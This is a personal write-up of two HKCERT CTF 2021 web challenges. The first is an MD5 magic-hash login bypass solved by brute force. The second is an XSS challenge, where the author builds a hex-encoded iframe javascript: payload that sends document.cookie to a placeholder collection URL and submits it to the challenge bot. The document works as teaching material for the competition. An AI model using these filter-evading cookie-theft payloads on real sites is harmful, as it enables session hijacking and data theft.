I just finished 2 challenges TT
HKCERT CTF - 12 Nov 2021

1. Challenge Name: 因講了出來 (Web - 150 points)

Open the link 
![image](https://user-images.githubusercontent.com/72589672/141679511-7a6f8a52-2877-41d1-9112-5e847aabdfa4.png)

I clicked the hint to see any interesting things...
It will redirect you to the source.php, you can see the source codes.
So, there is something interestings, becasue it is used the magic hash for validation and we also have the username.

The code showed there are 2 conditions one is "hash('md5', $password) == 0 " which means the input password must be md5 magic hash. (What is magic hash: https://www.whitehatsec.com/blog/magic-hashes/)
The second condition is "substr($password,0,strlen('hkcert')) === 'hkcert'" which means the password must be start from hkcert.
![image](https://user-images.githubusercontent.com/72589672/141678942-b8868440-da03-4cc2-9cc9-6e450d73758d.png)

BE CAREFUL!! 
-> The length of password cannot longer than 24
![image](https://user-images.githubusercontent.com/72589672/141679291-beadfe5c-3690-4dda-9a66-0e6cd63c7f32.png)

-> The following code shows we cannot use the cracked password, try to avoid we crack the same password.
![image](https://user-images.githubusercontent.com/72589672/141679107-6d4558cd-ded4-447c-86c6-a19c62c2f383.png)

Then, we can try to bruteforce the password by using python script.
![image](https://user-images.githubusercontent.com/72589672/141679457-fe572bbb-5bf9-41de-8b16-a4a459844c20.png)

So, we can use username hkcert and the craked password hkcertsadxxxxxx to login the page and get the flag!

2. Challenge Name: 純孩兒 BABY XSS (Web - 100 points) XSS
Read the description:
![image](https://user-images.githubusercontent.com/72589672/141679818-b9210c24-868c-4bb8-b994-21ebcb5d6e3a.png)
So I went to the training platform and learnt from HKCERT Workshop - infrant XSS: https://training.hkcert21.pwnable.hk/

Open the link
![image](https://user-images.githubusercontent.com/72589672/141679516-f15351f3-f60c-4660-9963-068a31ef77f5.png)

To view this page source code, I found there are some opfusted javascript
![image](https://user-images.githubusercontent.com/72589672/141679766-41cf1146-509d-4306-a0a2-d1013d8e7cef.png)

Using the deobfuscate website (https://deobfuscate.io/) to find the javascript
![image](https://user-images.githubusercontent.com/72589672/141679982-95e8d359-7280-44bf-b25f-caff805dcfdb.png)

Learnt from the workshop, the following codes means we can rewrite this function 
![image](https://user-images.githubusercontent.com/72589672/141680220-a13a87be-49ba-43db-b99a-9719b3b8597d.png)

So, I can try to test the page can execute the javascript or not, but it doesn't work
![image](https://user-images.githubusercontent.com/72589672/141679585-368e5a5e-6636-4c85-a7da-fc5896fbc372.png)

I tried to used different methods to trigger the javascript. 
Luckily, I can trigger the javascript by using the UTF-8 encode with the iframe tag. (Learnt from: https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
Enter: <iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
![image](https://user-images.githubusercontent.com/72589672/141679658-d95d90e7-4530-4817-a0e6-8d5c44eba3e0.png)
![image](https://user-images.githubusercontent.com/72589672/141679638-8bb2cc8b-e04f-4796-b45a-44dc688f1f6e.png)

Then, I can use a website to collect data to steal the data from the client.
The workshop suggested me to use https://requestbin.com/, so I registed it.

Therefore, I can use <iframe src=javascript:javascript:location.href='http://yourwebsiteurl/'></iframe>
Before inject the code into the textarea, we need to encode the url. I used this website https://www.browserling.com/tools/utf8-encode to encode.
![image](https://user-images.githubusercontent.com/72589672/141680425-8352c127-f9fb-4550-99d1-61abcf69733b.png)
Remember: Replace '\x' to '%'

Example: \x59\x6f\x75\x72\x20\x77\x65\x62\x73\x69\x74\x65\x20\x75\x72\x6c to %59%6f%75%72%20%77%65%62%73%69%74%65%20%75%72%6c

Then, we can insert the code into the textarea.
<iframe src=javascript:%59%6f%75%72%20%77%65%62%73%69%74%65%20%75%72%6c></iframe>
You can see the result on the frame.
![image](https://user-images.githubusercontent.com/72589672/141680598-846d8da1-5612-4497-959c-644a3a070c7f.png)

I also go to my website to confirm the event is triggered. It works!!!
![image](https://user-images.githubusercontent.com/72589672/141680697-b974dcf7-f661-4af8-9b72-c774a16efa81.png)

I can use the document.cookies get cookies NOW!!
The javascirpt will be like this: <iframe src=javascript:location.href='http://yourwebsiteurl/?'+document.cookie></iframe>
![image](https://user-images.githubusercontent.com/72589672/141680895-2ed0ca5a-333f-48a3-be89-b9734f81374b.png)

Encode again: <iframe src=javascript:%6c%6f%63%61%74%69%6f%6e%2e%68%72%65%66%3d%27%68%74%74%70%73%3a%2f%2f%79%6f%75%72%77%65%62%73%69%74%65%75%72%6c%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65></iframe>
Then, we can inject the code into textare to steal the client data!
![image](https://user-images.githubusercontent.com/72589672/141680937-e51ff854-29b7-402d-a504-e270c28488a4.png)

After we verified it also successful triggered the event on the website, we can copy the url on BABY XSS website.
![image](https://user-images.githubusercontent.com/72589672/141681026-4fe923c5-71ae-4b15-8927-de892147c329.png)

Go to the XSS Bot Page, select the bayXSS Challenge and enter the copied url into the URL textbox. Click Submit Query!
http://babyxss-m7neh9.hkcert21.pwnable.hk/#%3Ciframe%20src=javascript:%256c%256f%2563%2561%2574%2569%256f%256e%252e%2568%2572%2565%2566%253d%2527%2568%2574%2574%2570%2573%253a%252f%252f%2579%256f%2575%2572%2577%2565%2562%2573%2569%2574%2565%2575%2572%256c%253f%2527%252b%2564%256f%2563%2575%256d%2565%256e%2574%252e%2563%256f%256f%256b%2569%2565%3E%3C/iframe%3E
![image](https://user-images.githubusercontent.com/72589672/141681153-f5864f4a-39e2-4bda-96b7-1dc89571f9ef.png)

Now, you can go to your website to check the triggered event's query. The flag is there!!



